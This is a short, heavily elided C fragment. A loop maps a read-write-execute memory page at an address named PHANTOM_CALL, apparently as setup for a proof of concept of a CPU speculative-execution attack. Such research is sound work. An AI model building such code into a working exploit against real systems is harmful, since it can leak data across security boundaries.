...
int main(int argc, char *argv[]){
    ...
    for(int i = 0; i < ROUNDS; i++){
        ...
        if(mmap((void*)(PHANTOM_CALL & ~0xfff), 0x8000, PROT_RWX, MMAP_FLAGS, -1, 0) == MAP_FAILED){
        }
